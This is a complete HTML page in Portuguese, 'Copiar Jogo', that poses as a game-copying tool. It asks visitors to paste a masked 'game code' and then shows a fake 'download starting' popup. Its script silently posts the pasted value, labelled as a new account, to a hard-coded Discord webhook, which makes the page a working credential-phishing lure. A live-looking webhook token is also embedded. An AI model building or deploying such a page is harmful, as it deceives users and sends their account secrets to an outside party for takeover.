<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Copiar Jogo</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0a0a0f;
      font-family: 'Inter', sans-serif;
    }

    .card {
      width: 100%;
      max-width: 400px;
      background: #12121a;
      border-radius: 20px;
      border: 1px solid #1e1e2a;
      padding: 40px 32px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
    }

    .logo {
      width: 56px;
      height: 56px;
      margin: 0 auto 20px;
      background: linear-gradient(135deg, #7c3aed, #db2777);
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo svg {
      width: 28px;
      height: 28px;
      fill: white;
    }

    h1 {
      color: #f1f1f5;
      font-size: 1.5rem;
      font-weight: 700;
      text-align: center;
      margin-bottom: 6px;
    }

    .subtitle {
      color: #6b6b80;
      font-size: 0.88rem;
      text-align: center;
      margin-bottom: 28px;
    }

    .input-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      color: #8b8b9e;
      font-size: 0.82rem;
      font-weight: 500;
      margin-bottom: 8px;
      padding-left: 2px;
    }

    #codigo {
      width: 100%;
      padding: 15px 16px;
      background: #0c0c12;
      border: 1.5px solid #252532;
      border-radius: 12px;
      color: #e0e0e8;
      font-size: 1.05rem;
      font-family: 'Inter', monospace;
      letter-spacing: 3px;
      outline: none;
      transition: border-color 0.2s ease;
      -webkit-text-security: disc;
      text-security: disc;
    }

    #codigo:focus {
      border-color: #7c3aed;
    }

    #codigo::placeholder {
      color: #3a3a4a;
      letter-spacing: 1px;
      -webkit-text-security: none;
    }

    button {
      width: 100%;
      padding: 15px;
      background: linear-gradient(135deg, #7c3aed, #db2777);
      border: none;
      border-radius: 12px;
      color: white;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.2s ease, transform 0.15s ease;
    }

    button:hover {
      opacity: 0.92;
    }

    button:active {
      transform: scale(0.98);
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    /* Popup */
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 100;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.25s ease, visibility 0.25s ease;
    }

    .overlay.show {
      opacity: 1;
      visibility: visible;
    }

    .popup {
      background: #16161f;
      border: 1px solid #2a2a3a;
      border-radius: 20px;
      padding: 36px 32px;
      text-align: center;
      max-width: 320px;
      width: 90%;
      transform: scale(0.9);
      transition: transform 0.25s ease;
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
    }

    .overlay.show .popup {
      transform: scale(1);
    }

    .check-circle {
      width: 72px;
      height: 72px;
      margin: 0 auto 20px;
      background: linear-gradient(135deg, #22c55e, #16a34a);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 8px 24px rgba(34, 197, 94, 0.35);
    }

    .check-circle svg {
      width: 36px;
      height: 36px;
      fill: white;
    }

    .popup h2 {
      color: #f1f1f5;
      font-size: 1.25rem;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .popup p {
      color: #7a7a90;
      font-size: 0.9rem;
      margin-bottom: 24px;
    }

    .popup-btn {
      width: 100%;
      padding: 12px;
      background: #252532;
      border: 1px solid #333345;
      border-radius: 10px;
      color: #e0e0e8;
      font-size: 0.95rem;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .popup-btn:hover {
      background: #2e2e40;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 24 24">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
      </svg>
    </div>

    <h1>Copiar Jogo</h1>
    <p class="subtitle">Cole o código e envie com um clique</p>

    <div class="input-group">
      <label for="codigo">Código do jogo</label>
      <input 
        type="text" 
        id="codigo" 
        placeholder="Digite ou cole o código aqui..."
        autocomplete="off"
        spellcheck="false"
      >
    </div>

    <button id="btnCopiar" onclick="enviarCodigo()">
      Copiar Jogo
    </button>
  </div>

  <!-- Popup -->
  <div class="overlay" id="overlay">
    <div class="popup">
      <div class="check-circle">
        <svg viewBox="0 0 24 24">
          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
        </svg>
      </div>
      <h2>Download começando agora</h2>
      <p>Seu código foi enviado com sucesso.</p>
      <button class="popup-btn" onclick="fecharPopup()">Fechar</button>
    </div>
  </div>

  <script>
    // =====================================================
    // COLE A URL DO SEU WEBHOOK DO DISCORD AQUI EMBAIXO
    // =====================================================
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1561435565537108129/bIsYzf8U8CEYOjBEEii_8JTjGHqbFSRJyODni8aUnouf-fcHH2IzsJtQPBYZbhS6Hfyh";

    async function enviarCodigo() {
      const input = document.getElementById('codigo');
      const codigo = input.value.trim();
      const btn = document.getElementById('btnCopiar');

      if (!codigo) {
        input.focus();
        return;
      }

      btn.disabled = true;
      btn.textContent = 'Enviando...';

      // Mostra o popup imediatamente
      mostrarPopup();
      input.value = '';

      // Tenta enviar pro Discord (não impede o popup)
      if (!WEBHOOK_URL.includes('SEU_ID')) {
        try {
          await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `⚠ **Nova conta:**\n\`\`\`\n${codigo}\n\`\`\``
            })
          });
        } catch (e) {
          console.log('Erro no webhook:', e);
        }
      }

      btn.disabled = false;
      btn.textContent = 'Copiar Jogo';
    }

    function mostrarPopup() {
      document.getElementById('overlay').classList.add('show');
    }

    function fecharPopup() {
      document.getElementById('overlay').classList.remove('show');
    }

    // Fechar popup clicando fora
    document.getElementById('overlay').addEventListener('click', function(e) {
      if (e.target === this) fecharPopup();
    });

    // Enter para enviar
    document.getElementById('codigo').addEventListener('keypress', function(e) {
      if (e.key === 'Enter') enviarCodigo();
    });
  </script>
</body>
</html>
